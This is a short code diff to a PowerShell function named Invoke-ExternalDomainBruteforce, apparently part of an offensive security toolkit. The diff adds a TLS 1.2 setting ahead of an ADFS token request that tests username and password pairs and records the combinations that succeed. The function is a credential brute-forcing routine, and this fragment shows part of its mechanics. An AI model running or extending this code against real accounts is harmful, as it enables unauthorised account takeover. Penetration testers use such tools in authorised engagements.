@@ -228,6 +228,7 @@ function Invoke-ExternalDomainBruteforce{
 			# Attempt to request a security token using username/password
             try{
                 $ErrorActionPreference = "Stop";
+		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
                 $EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
                 Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green
